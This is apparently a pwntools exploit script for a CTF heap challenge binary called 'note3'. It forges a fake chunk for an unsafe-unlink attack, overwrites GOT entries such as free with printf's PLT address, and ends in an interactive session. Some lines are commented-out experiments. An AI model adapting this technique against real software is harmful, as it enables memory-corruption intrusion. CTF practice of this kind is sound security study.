from pwn import *
context(
	log_level='debug',
	binary='./note3'
)
e=context.binary
libc=e.libc
io=process()
# io=process('books',env={"LD_PRELOAD":"libc.so.6"})

#=========================================
#Function

def dbg(script=''):
	gdb.attach(io,gdbscript=script)

def menu(func):
	io.sendlineafter('>>\n',str(func))

def new(size,content):
	menu(1)
	io.sendlineafter('(less than 1024)\n',str(size))
	io.sendlineafter('Input the note content:\n',str(content))

def show(num):
	menu(2)

def edit(num,content):
	menu(3)
	io.sendlineafter('Input the id of the note:\n',str(num))
	io.sendlineafter('Input the new content:\n',str(content))

def delete(num):
	menu(4)
	io.sendlineafter('Input the id of the note:\n',str(num))



#=========================================
#VAR
free_addr = e.got['free']
puts_addr = e.got['puts']
atoi_addr = e.got['atoi']
exit_addr = e.got['exit']
free_plt = e.plt['free']
puts_plt = e.plt['puts']
printf_plt = e.plt['printf']
success('free_addr: ' + hex(free_addr))
success('free_plt: ' + hex(free_addr))
success('puts_addr: ' + hex(puts_addr))
success('puts_addr: ' + hex(puts_addr))
success('atoi_addr: ' + hex(atoi_addr))

libc_off = 541936
ptr = 0x6020C8
gadget = [283158,283242,983716,987463]
#=========================================

new(0,'aaaa') #0
new(0x40,'bbbb') #1
new(0x80,'cccc') #2
new(0x30,'dddd') #3
new(0x30,'eeee') #4

payload = 'a'*0x10 +p64(0)+p64(0x51) + p64(0)+p64(0x40)+p64(ptr+0x8-0x18)+p64(ptr+0x8-0x10) +'a'*0x20+p64(0x40) + p64(0x90)
edit(0,payload)
delete(2)

# # raw_input()

edit(1,p64(0)*3+p64(ptr+0x18))


edit(1,p64(free_addr))
edit(3,p64(printf_plt)*2)


# edit(1,p64(puts_addr))
# io.recv()
io.recv()
io.sendline('3')
io.recv()
io.sendline('1')
io.recv()
io.sendline(p64(0x602030))

# raw_input()

# edit(0,'aaaa')
# delete(3)
# dbg()
# raw_input()
# edit(0,p64(printf_plt)*2)


# dbg()


# 
# payload = p64(0)*2 + p64(free_addr) + p64(atoi_addr)
# raw_input()
# edit(0,p64(puts_plt))
# raw_input()
# delete(0)


io.interactive()
